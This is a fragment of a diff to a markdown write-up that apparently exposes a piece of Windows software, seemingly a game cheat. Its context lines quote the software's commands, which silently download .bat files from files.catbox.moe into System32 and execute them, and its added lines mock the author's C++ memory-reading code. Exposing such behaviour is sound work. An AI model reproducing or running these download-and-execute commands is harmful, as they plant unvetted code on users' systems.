@@ -73,3 +73,9 @@ as you see it shows as `GetProcessAddress(... "NtUnloadDriver");` just like the 
 - curl --silent https://files.catbox.moe/kis4ge.bat --output C:\\Windows\\System32\\check.bat >nul 2>&1
 - cd C:\\Windows\\System32\\ && clean.bat
 - curl --silent https://files.catbox.moe/ykmoac.bat --output C:\\Windows\\System32\\clean.bat >nul 2>&1
+
+
+### doesn't understand basic c++ concepts
+<img width="1219" height="660" alt="uintptr_t pos_ptr = readuintptr_t(player_base + offsetspos); float x = readfloat(pos_ptr + 0x0); float y = readfloat(pos_ptr + 0x4); float z = readfloat(pos_ptr + 0x8);" src="https://github.com/user-attachments/assets/dfaf063e-2fdf-4c8a-8bc5-c89aefce2299" />
+
+
